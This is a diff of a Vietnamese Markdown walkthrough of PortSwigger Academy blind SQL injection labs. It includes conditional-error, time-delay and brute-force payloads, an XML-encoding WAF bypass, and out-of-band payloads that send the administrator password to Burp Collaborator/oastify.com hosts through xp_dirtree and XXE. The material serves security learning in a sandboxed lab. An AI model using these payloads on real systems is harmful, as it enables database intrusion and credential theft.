@@ -835,7 +835,7 @@ Kết quả của truy vấn SQL không được trả về và ứng dụng kh�
 
 Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các cột là `username` và `password`. Bạn cần khai thác lỗ hổng blind SQL injection để tìm ra mật khẩu của người dùng `administrator`.
 
-Để giải quyết phòng thí nghiệm, hãy đăng nhập bằng người dùng `administrator`.
+Để giải quyết bài lab, hãy đăng nhập bằng người dùng `administrator`.
 
 ## Các bước thực hiện
 1. Mở **BurpSuite**, chọn tab **Proxy**.
@@ -859,24 +859,24 @@ Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các c�
 
 ![alt text](images/41.png)
 
-8. Chuyển sang tab **Settings** và di chuyển tới *Grep - Match*, chọn *Flag result...* để đánh dấu các kết quả có từ trùng khớp, sau đó chọn *Clear>Yes* để xoá toàn bộ thông tin hiện có trong danh sách. Cuối cùng thêm vào `OK` và bỏ tích ở *Exclude HTTP headers*, điều này giúp ta dễ dàng xác định khi nào ứng dụng hoạt động bình thường (trả về HTTP header `OK`). Chọn **Start attack** để bắt đầu thực hiện tấn công.
+0. Chuyển sang tab **Settings** và di chuyển tới *Grep - Match*, chọn *Flag result...* để đánh dấu các kết quả có từ trùng khớp, sau đó chọn *Clear>Yes* để xoá toàn bộ thông tin hiện có trong danh sách. Cuối cùng thêm vào `OK` và bỏ tích ở *Exclude HTTP headers*, điều này giúp ta dễ dàng xác định khi nào ứng dụng hoạt động bình thường (trả về HTTP header `OK`). Chọn **Start attack** để bắt đầu thực hiện tấn công.
 
-9. Bảng kết quả sẽ xuất hiện và hiển thị độ dài của phản hồi trong mỗi lần gửi. Ta có thể thấy độ dài này thay đổi khi tham số truyền vào lớn hơn 19, có thể kết luận độ dài mật khẩu là 20.
+10. Bảng kết quả sẽ xuất hiện và hiển thị độ dài của phản hồi trong mỗi lần gửi. Ta có thể thấy độ dài này thay đổi khi tham số truyền vào lớn hơn 19, có thể kết luận độ dài mật khẩu là 20.
 
 ![alt text](images/42.png)
 
-10. Sau khi biết được độ dài của mật khẩu, ta sẽ thực hiện Brute Force mật khẩu chính xác của người dùng `administrator`. Được biết mật khẩu sẽ chỉ chứa chữ cái thường và chữ số, ta chuyển về tab **Positions** sử dụng gói tin như sau để tấn công:
+11. Sau khi biết được độ dài của mật khẩu, ta sẽ thực hiện Brute Force mật khẩu chính xác của người dùng `administrator`. Được biết mật khẩu sẽ chỉ chứa chữ cái thường và chữ số, ta chuyển về tab **Positions** sử dụng gói tin như sau để tấn công:
 
 ```
 '||(SELECT CASE WHEN SUBSTR(password,§§,1)='§§' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'
 ```
 
-11. Lần này, ta sẽ chọn *Attack type* là `Cluster bomb` để thực hiện tấn công vào 2 vị trí payload (ký hiệu §§) cùng 1 lúc. Chuyển qua tab **Payloads**, ở *Payload set* đầu tiên, ta sẽ chọn *Payload type* là `Numbers` chạy từ 1 đến 20 để duyệt toàn bộ vị trí của mật khẩu. Ở *Payload set* thứ 2, ta sẽ chọn *Payload type* là `Brute forcer`, chọn *Min length* và *Max length* là 1, sau đó chọn **Start attack** để thực hiện tấn công.
-12. Với bảng thông tin được hiển thị, chuột phải vào *Payload 1* và chọn *Sort>Ascending*, sau đó chuột phải vào *OK* và chọn *Sort>Descending*. Ta sẽ có được mật khẩu cho người dùng `administrator` là `llwv4re8t5s0l7dd701u`.
+12. Lần này, ta sẽ chọn *Attack type* là `Cluster bomb` để thực hiện tấn công vào 2 vị trí payload (ký hiệu §§) cùng 1 lúc. Chuyển qua tab **Payloads**, ở *Payload set* đầu tiên, ta sẽ chọn *Payload type* là `Numbers` chạy từ 1 đến 20 để duyệt toàn bộ vị trí của mật khẩu. Ở *Payload set* thứ 2, ta sẽ chọn *Payload type* là `Brute forcer`, chọn *Min length* và *Max length* là 1, sau đó chọn **Start attack** để thực hiện tấn công.
+13. Với bảng thông tin được hiển thị, chuột phải vào *Payload 1* và chọn *Sort>Ascending*, sau đó chuột phải vào *OK* và chọn *Sort>Descending*. Ta sẽ có được mật khẩu cho người dùng `administrator` là `llwv4re8t5s0l7dd701u`.
 
 ![alt text](images/43.png)
 
-13. Quay trở lại tab **Proxy**, chọn **Intercept is on** để chuyển nó về **Intercept is off**, sau đó chọn *My account* để mở giao diện đăng nhập. Sử dụng tên người dùng là `administrator` và mật khẩu là `llwv4re8t5s0l7dd701u`. Sau khi đăng nhập thành công, ứng dụng sẽ thông báo hoàn thành bài lab.
+14. Quay trở lại tab **Proxy**, chọn **Intercept is on** để chuyển nó về **Intercept is off**, sau đó chọn *My account* để mở giao diện đăng nhập. Sử dụng tên người dùng là `administrator` và mật khẩu là `llwv4re8t5s0l7dd701u`. Sau khi đăng nhập thành công, ứng dụng sẽ thông báo hoàn thành bài lab.
 
 ![alt text](images/44.png)
 
@@ -906,7 +906,7 @@ Loại truy vấn này cũng có thể hữu ích nếu một giới hạn ký t
 
 Bài lab này chứa một lỗ hổng SQL injection. Ứng dụng sử dụng cookie theo dõi để phân tích, và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi. Kết quả của truy vấn SQL không được trả về.
 
-Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các cột tên là `username` và `password`. Để giải quyết phòng thí nghiệm này, hãy tìm cách làm rò rỉ mật khẩu cho người dùng `administrator`, sau đó đăng nhập vào tài khoản đó.
+Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các cột tên là `username` và `password`. Để giải quyết bài lab này, hãy tìm cách làm rò rỉ mật khẩu cho người dùng `administrator`, sau đó đăng nhập vào tài khoản đó.
 
 ## Các bước thực hiện
 
@@ -940,7 +940,7 @@ Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các c�
 
 ![alt text](images/48.png)
 
-10. Reload ứng dụng, sau đó chọn **My account** và đăng nhập bằng thông tin đăng nhập vừa nhận được. Ưng dụng sẽ hiển thị đăng nhập thành công và thông báo hoàn thành bài lab.
+10. Reload ứng dụng, sau đó chọn **My account** và đăng nhập bằng thông tin đăng nhập vừa nhận được. Ứng dụng sẽ hiển thị đăng nhập thành công và thông báo hoàn thành bài lab.
 
 ![alt text](images/49.png)
 
@@ -972,12 +972,188 @@ Sử dụng kỹ thuật này, chúng ta có thể truy xuất dữ liệu bằn
 
 ## Mô tả bài lab
 
-Phòng thí nghiệm này chứa một lỗ hổng blind SQL injection. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi.
+Bài lab này chứa một lỗ hổng blind SQL injection. Ứng dụng sử dụng cookie theo dõi để phân tích và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi.
 
 Kết quả của truy vấn SQL không được trả về và ứng dụng không phản hồi khác nhau dựa trên việc truy vấn có trả về bất kỳ hàng nào hay gây ra lỗi. Tuy nhiên, vì truy vấn được thực thi đồng bộ, có thể kích hoạt độ trễ thời gian có điều kiện để suy ra thông tin.
 
 Cơ sở dữ liệu chứa một bảng khác gọi là `users`, với các cột tên là `username` và `password`. Bạn cần khai thác lỗ hổng blind SQL injection để tìm ra mật khẩu của người dùng `administrator`.
 
-Để giải quyết phòng thí nghiệm này, hãy đăng nhập vào tài khoản người dùng `administrator`.
+Để giải quyết bài lab này, hãy đăng nhập vào tài khoản người dùng `administrator`.
 
 ## Các bước thực hiện
+1. Mở **BurpSuite**, chọn tab **Proxy**.
+2. Chọn **Open browser**, truy cập vào URL của bài lab và điều chỉnh kích thước cửa sổ để quan sát cả 2 ứng dụng.
+
+![resize](images/50.png)
+
+3. Chọn **Intercept is off** để chuyển nó sang **Intercept is on**.
+4. Chọn một filter bất kỳ để nhận gói tin, ở đây tôi chọn *Tech gifts*
+5. Phân tích gói tin mà BurpSuite đã chặn lại, chọn *Action>Send to Repeater* và *Action>Send to Intruder*, sau đó chuyển sang tab **Repeater**.
+
+![alt text](images/51.png)
+
+6. Xác nhận rằng ứng dụng đang gán `TrackingId` cho chúng ta là `wP8ZmH7Di8tWDBqB`, ta có thể thêm vào sau đó một số thông tin để thực hiện tấn công SQL injection. Được biết ứng dụng không trả về bất kỳ cột thông tin nào từ truy vấn SQL, đồng thời cũng không trả về thông báo lỗi. Tuy vậy truy vấn SQL vẫn được thực hiện và từ đó ta có thể kích hoạt độ trễ có điều kiện để xác định các thông tin nhạy cảm. Trước hết cần xác định loại cơ sở dữ liệu đang được sử dụng, ta có thể thử các gói tin khác nhau nối vào giá trị của `TrackingId` để thực hiện điều này:
+
+
+| Database   | Payload                                    |
+| ---------- | ------------------------------------------ |
+| Oracle     | `'%3B+dbms_pipe.receive_message(('a'),10)` |
+| Microsoft  | `'%3B+WAITFOR+DELAY+'0:0:10'`              |
+| PostgreSQL | `'%3B+SELECT+pg_sleep(10)`                 |
+| MySQL      | `'%3B+SELECT+SLEEP(10)`                    |
+
+> Trong đó, `%3B` là dấu `;`, các loại cơ sở dữ liệu trừ Oracle đều có thể thực hiện nhiều truy vấn trên cùng một dòng nên ta có thể loại bỏ Oracle. Thực hiện với từng gói tin ta có thể nhận thấy được khi thử với gói tin dạng PostgreSQL, ứng dụng phản hồi lâu hơn bình thường, từ đó ta xác nhận ứng dụng sử dụng cơ sở dữ liệu PostgreSQL.
+
+7. Di chuyển sang tab **Intruder**, bài lab đã cho chúng ta biết trong cơ sở dữ liệu của ứng dụng có một bảng `users` có chứa cột `username` và `password`, từ đây ta có thể thực hiện tấn công bằng gói tin như sau để xác định độ dài mật khẩu của người dùng `administrator`, gói tin sẽ kích hoạt độ trễ 10 giây nếu độ dài mật khẩu không chính xác và ứng dụng sẽ chạy bình thường nếu độ dài chính xác:
+```
+'%3B+SELECT+CASE+WHEN+LENGTH(password)=§§+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
+```
+8. Chuyển sang tab **Payloads** để chỉnh sửa gói tin truyền vào mỗi lần thực hiện tấn công. Chọn *Payload type* là `Numbers` và điều chỉnh cho thông tin truyền vào sẽ chạy từ 1 đến 30.
+
+![alt text](images/52.png)
+
+9. Bảng kết quả sẽ xuất hiện và hiển thị số lượng phản hồi khi truyền payload `20` cao đột biến, điều này xảy ra khi BurpSuite chưa nhận được phản hồi của ứng dụng và tiếp tục gửi gói tin cho đến khi có phản hồi. Từ đó xác định được mật khẩu của người dùng `administrator` có độ dài là 20.
+
+![alt text](images/53.png)
+
+10. Sau khi biết được độ dài của mật khẩu, ta sẽ thực hiện Brute Force mật khẩu chính xác của người dùng `administrator`. Được biết mật khẩu sẽ chỉ chứa chữ cái thường và chữ số, ta chuyển về tab **Positions** sử dụng gói tin như sau để tấn công:
+
+```
+'%3B+SELECT+CASE+WHEN+SUBSTRING(password,§§,1)='§§'+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
+```
+
+11. Lần này, ta sẽ chọn *Attack type* là `Cluster bomb` để thực hiện tấn công vào 2 vị trí payload (ký hiệu §§) cùng 1 lúc. Chuyển qua tab **Payloads**, ở *Payload set* đầu tiên, ta sẽ chọn *Payload type* là `Numbers` chạy từ 1 đến 20 để duyệt toàn bộ vị trí của mật khẩu. Ở *Payload set* thứ 2, ta sẽ chọn *Payload type* là `Brute forcer`, chọn *Min length* và *Max length* là 1, sau đó chọn **Start attack** để thực hiện tấn công.
+12. Với bảng thông tin được hiển thị, chuột phải vào *Response received* và chọn *Sort>Descending* để hiển thị các gói tin có số phản hồi cao đột biến. Bôi đen các cột này, chuột phải và chọn *Highlight* sau đó chuyển chế độ hiển thị về `Show only highlighted items`. Cuối cùng chuột phải vào *Payload 1* và chọn *Sort>Ascending*. Ta sẽ có được mật khẩu cho người dùng `administrator` là `03bgge7gqmqaj1mqmzs9`.
+
+![alt text](images/54.png)
+
+13. Quay trở lại tab **Proxy**, chọn **Intercept is on** để chuyển nó về **Intercept is off**, sau đó chọn *My account* để mở giao diện đăng nhập. Sử dụng tên người dùng là `administrator` và mật khẩu là `03bgge7gqmqaj1mqmzs9`. Sau khi đăng nhập thành công, ứng dụng sẽ thông báo hoàn thành bài lab.
+
+![alt text](images/55.png)
+
+# Khai thác lỗi SQL injection mù bằng các kỹ thuật ngoài băng tần (OAST)
+
+Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước nhưng thực hiện nó một cách không đồng bộ. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong luồng ban đầu và sử dụng một luồng khác để thực hiện truy vấn SQL bằng cookie theo dõi. Truy vấn này vẫn dễ bị tấn công SQL injection, nhưng không có kỹ thuật nào được mô tả cho đến nay sẽ hiệu quả. Phản hồi của ứng dụng không phụ thuộc vào việc truy vấn trả lại dữ liệu, xảy ra lỗi cơ sở dữ liệu hay thời gian thực hiện truy vấn.
+
+Trong tình huống này, thường có thể khai thác lỗ hổng SQL injection mù bằng cách kích hoạt các tương tác mạng ngoài băng tần tới một hệ thống mà bạn kiểm soát. Các tương tác này có thể được kích hoạt dựa trên một điều kiện được tiêm vào để suy luận thông tin từng mảnh một. Hữu ích hơn, dữ liệu có thể được trích xuất trực tiếp trong tương tác mạng.
+
+Một loạt các giao thức mạng có thể được sử dụng cho mục đích này, nhưng thường thì hiệu quả nhất là DNS (dịch vụ tên miền). Nhiều mạng sản xuất cho phép truy vấn DNS tự do, vì chúng cần thiết cho hoạt động bình thường của các hệ thống sản xuất.
+
+Công cụ dễ sử dụng và đáng tin cậy nhất để sử dụng các kỹ thuật ngoài băng tần là Burp Collaborator. Đây là một máy chủ cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm DNS. Nó cho phép bạn phát hiện khi nào các tương tác mạng xảy ra do việc gửi các payloads cá nhân đến một ứng dụng có lỗ hổng. Burp Suite Professional bao gồm một máy khách tích hợp được cấu hình để làm việc với Burp Collaborator ngay từ đầu. Để biết thêm thông tin, hãy xem tài liệu hướng dẫn của Burp Collaborator.
+
+Các kỹ thuật để kích hoạt một truy vấn DNS cụ thể đối với loại cơ sở dữ liệu đang sử dụng. Ví dụ, đầu vào sau đây trên Microsoft SQL Server có thể được sử dụng để gây ra một truy vấn DNS trên một miền được chỉ định:
+
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+Điều này khiến cơ sở dữ liệu thực hiện một truy vấn đối với miền sau:
+
+```
+0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+```
+
+Bạn có thể sử dụng Burp Collaborator để tạo một miền con duy nhất và kiểm tra máy chủ Collaborator để xác nhận khi có bất kỳ truy vấn DNS nào xảy ra.
+
+# Lab: Blind SQL injection with out-of-band interaction
+
+## Mô tả bài lab
+
+Bài lab này chứa lỗ hổng SQL injection mù. Ứng dụng sử dụng một cookie theo dõi cho mục đích phân tích và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi.
+
+Truy vấn SQL được thực hiện không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, bạn có thể kích hoạt các tương tác ngoài băng tần với một miền bên ngoài.
+
+Để giải quyết bài lab, hãy khai thác lỗ hổng SQL injection để gây ra một truy vấn DNS tới Burp Collaborator.
+
+> ## Lưu ý:
+> Để ngăn nền tảng Academy bị sử dụng để tấn công các bên thứ ba, tường lửa sẽ chặn các tương tác giữa các bài lab và các hệ thống bên ngoài tùy ý. Để giải quyết bài lab, bạn phải sử dụng máy chủ công cộng mặc định của Burp Collaborator.
+
+Sau khi xác nhận được cách kích hoạt các tương tác ngoài băng tần, bạn có thể sử dụng kênh ngoài băng tần để trích xuất dữ liệu từ ứng dụng có lỗ hổng. Ví dụ:
+
+```
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+Đầu vào này đọc mật khẩu của người dùng Administrator, thêm một miền phụ duy nhất của Collaborator, và kích hoạt một truy vấn DNS. Truy vấn này cho phép bạn xem mật khẩu đã được thu thập:
+
+```
+S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+```
+
+Các kỹ thuật ngoài băng tần (OAST) là một cách mạnh mẽ để phát hiện và khai thác lỗ hổng SQL injection mù, nhờ vào khả năng thành công cao và khả năng trích xuất dữ liệu trực tiếp trong kênh ngoài băng tần. Vì lý do này, các kỹ thuật OAST thường được ưu tiên ngay cả trong những tình huống mà các kỹ thuật khai thác mù khác cũng hoạt động.
+
+> ## Lưu ý:
+> Có nhiều cách khác nhau để kích hoạt các tương tác ngoài băng tần, và các kỹ thuật khác nhau áp dụng cho các loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem bảng gian lận SQL injection.
+
+## Các bước thực hiện
+
+1. Mở **BurpSuite**, chọn tab **Proxy**.
+2. Chọn **Open browser**, truy cập vào URL của bài lab và điều chỉnh kích thước cửa sổ để quan sát cả 2 ứng dụng.
+3. Chọn **Intercept is off** để chuyển nó sang **Intercept is on**.
+4. Chọn một loại mặt hàng bất kỳ trên ứng dụng, ở ví dụ này tôi chọn *Accessories*.
+5. Di chuyển tới tab **Collaborator**, chọn **Copy to clipboard** để nhận tên miền tạm thời của BurpSuite Colaborator. Trong lần thực hiện này tôi nhận được tên miền là `tb8ibcag5b2l7soassmoovb9o0usii67.oastify.com`.
+6. Quay lại tab **Proxy** và thêm gói tin vào phần cuối của `TrackingId` để thực hiện tấn công:
+```
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//tb8ibcag5b2l7soassmoovb9o0usii67.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+```
+7. Chọn **Forward** và tắt **Intercept**, reload lại ứng dụng và thông báo hoàn thành bài lab sẽ hiện lên.
+
+# Lab: Blind SQL injection with out-of-band data exfiltration
+
+## Mô tả bài lab
+
+Bài lab này chứa lỗ hổng SQL injection mù. Ứng dụng sử dụng một cookie theo dõi cho mục đích phân tích và thực hiện một truy vấn SQL chứa giá trị của cookie được gửi.
+
+Truy vấn SQL được thực hiện không đồng bộ và không ảnh hưởng đến phản hồi của ứng dụng. Tuy nhiên, bạn có thể kích hoạt các tương tác ngoài băng tần với một miền bên ngoài.
+
+Cơ sở dữ liệu chứa một bảng khác có tên là users, với các cột có tên là username và password. Bạn cần khai thác lỗ hổng SQL injection mù để tìm ra mật khẩu của người dùng quản trị viên.
+
+Để giải quyết bài lab, hãy đăng nhập với tư cách người dùng quản trị viên.
+
+> ## Lưu ý:
+> Để ngăn nền tảng Academy bị sử dụng để tấn công các bên thứ ba, tường lửa của chúng tôi chặn các tương tác giữa các bài lab và các hệ thống bên ngoài tùy ý. Để giải quyết bài lab, bạn phải sử dụng máy chủ công cộng mặc định của Burp Collaborator.
+
+## Các bước thực hiện
+
+1. Mở **BurpSuite**, chọn tab **Proxy**.
+2. Chọn **Open browser**, truy cập vào URL của bài lab và điều chỉnh kích thước cửa sổ để quan sát cả 2 ứng dụng.
+3. Chọn **Intercept is off** để chuyển nó sang **Intercept is on**.
+4. Chọn một loại mặt hàng bất kỳ trên ứng dụng, ở ví dụ này tôi chọn *Accessories*.
+5. Di chuyển tới tab **Collaborator**, chọn **Copy to clipboard** để nhận tên miền tạm thời của BurpSuite Colaborator. Trong lần thực hiện này tôi nhận được tên miền là `1mo5cp8g7sxp8fjkbus64e54jvpmdc11.oastify.com`.
+6. Quay lại tab **Proxy** và thêm gói tin vào phần cuối của `TrackingId` để thực hiện tấn công:
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.1mo5cp8g7sxp8fjkbus64e54jvpmdc11.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+```
+7. Chọn **Forward** và tắt **Intercept**, sau đó di chuyển đến tab **Collaborator**. Ở đây sẽ hiển thị các thông tin được trao đổi giữa server của ứng dụng và BurpSuite Collaborator. Ở đây khi truy cập vào gói tin HTTP, ta có thể xem được phản hồi của server trả về mật khẩu của người dùng `administrator` khi xem mục **Request to Collaborator** (`zkva3bj82sf6v5exkb3l`).
+
+![alt text](images/56.png)
+
+8. Sử dụng thông tin đã lấy được để đăng nhập ứng dụng bằng cách chọn **My account**. Sau đó ứng dụng sẽ thông báo đăng nhập thành công và hoàn thành bài lab.
+
+# SQL injection trong các ngữ cảnh khác nhau
+
+Trong các bài lab trước, bạn đã sử dụng chuỗi truy vấn để tiêm payload SQL độc hại của mình. Tuy nhiên, bạn có thể thực hiện các cuộc tấn công SQL injection bằng bất kỳ đầu vào nào có thể kiểm soát được và được ứng dụng xử lý dưới dạng truy vấn SQL. Ví dụ, một số trang web nhận đầu vào ở định dạng JSON hoặc XML và sử dụng nó để truy vấn cơ sở dữ liệu.
+
+Các định dạng khác nhau này có thể cung cấp các cách khác nhau để bạn làm rối các cuộc tấn công vốn bị chặn do WAF và các cơ chế phòng thủ khác. Các triển khai yếu thường tìm kiếm các từ khóa SQL injection phổ biến trong yêu cầu, vì vậy bạn có thể vượt qua các bộ lọc này bằng cách mã hóa hoặc thoát ký tự trong các từ khóa bị cấm. Ví dụ, đoạn SQL injection dựa trên XML sau đây sử dụng một chuỗi thoát XML để mã hóa ký tự S trong từ SELECT:
+
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
+Đoạn này sẽ được giải mã phía máy chủ trước khi được truyền đến trình thông dịch SQL.
+
+# Lab: SQL injection with filter bypass via XML encoding
+
+## Mô tả bài lab
+
+Bài lab này chứa lỗ hổng SQL injection trong tính năng kiểm tra hàng tồn kho. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, vì vậy bạn có thể sử dụng một cuộc tấn công UNION để truy xuất dữ liệu từ các bảng khác.
+
+Cơ sở dữ liệu chứa một bảng `users`, trong đó có tên người dùng và mật khẩu của các người dùng đã đăng ký. Để giải quyết bài lab, hãy thực hiện một cuộc tấn công SQL injection để truy xuất thông tin đăng nhập của người dùng admin, sau đó đăng nhập vào tài khoản của họ.
+
+## Các bước thực hiện
+
